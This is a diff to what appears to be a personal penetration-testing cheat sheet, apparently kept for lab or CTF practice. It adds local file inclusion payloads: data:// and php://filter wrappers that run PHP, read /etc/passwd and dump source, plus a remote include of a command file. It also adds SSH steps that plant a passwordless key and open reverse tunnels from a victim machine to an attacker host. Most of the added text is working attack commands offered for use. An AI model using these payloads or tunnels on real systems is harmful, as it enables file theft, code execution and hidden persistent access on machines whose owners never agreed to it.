@@ -369,6 +369,19 @@ tcpdump portrange 21-23
 
 # Exploit LFI
 
+    cat cmd.txt
+    <?php phpinfo(); ?>
+    echo $(cat cmd.txt) | base64
+    PD9waHAgcGhwaW5mbygpOyA/Pgo=
+
+
+
+http://192.168.56.3/lfi.php?p=data://text/plain,%3C?php%20phpinfo();?%3E
+http://192.168.56.3/lfi.php?p=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+http://192.168.56.3/lfi.php?p=php://filter/convert.base64-encode/resource=/etc/passwd
+http://192.168.56.3/lfi.php?p=php://filter/convert.base64-encode/resource=lfi.php
+http://192.168.56.3/lfi.php?p=php://filter/read=convert.base64-encode/resource=lfi.php
+http://192.168.56.3/lfi.php?p=http://192.168.56.3/cmd.txt
 
 # SQL Injection
 
@@ -433,6 +446,10 @@ https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
     /etc/passwd
     ../../../etc/passwd
 
+# PHP Wrapper
+
+<https://www.php.net/manual/fr/wrappers.php>
+
 ## PHP Wrapper expect:// LFI
 
     http://127.0.0.1/fileincl/example1.php?page=expect://ls
@@ -460,6 +477,17 @@ http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-en
 
     referer
     /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc
+
+## PHP data://text/plain
+
+    /index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+
+Boxes : relativity
+    
+
+
+
+
 
 
 # Remote file access
@@ -1438,14 +1466,21 @@ https://github.com/rebootuser
 
 ## SSH
 
+    # victim's machine
+    ssh-keygen -P "" -f key
+
+    # attacker's machine
+    echo $(cat key.pub) >> authorized_keys
+
     # attacker's machine
     ssh -N -f -L 8080:internalTarget:80 user@<victim_ip>
     ssh -N -f -L 2222:internalTarget:22 user@<victim_ip>
 
-    # victim's machine
-    # ssh-keygen -P "" -f key
+    # attacker's machine
     ssh -N -f -R 2222:internalTarget:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@<attacker_ip> -i key 2>&1
-    
+
+    # victim's machine
+    ssh -f -N kali@172.16.16.1 -R 6667:127.0.0.1:6667 -i key
 
     
 
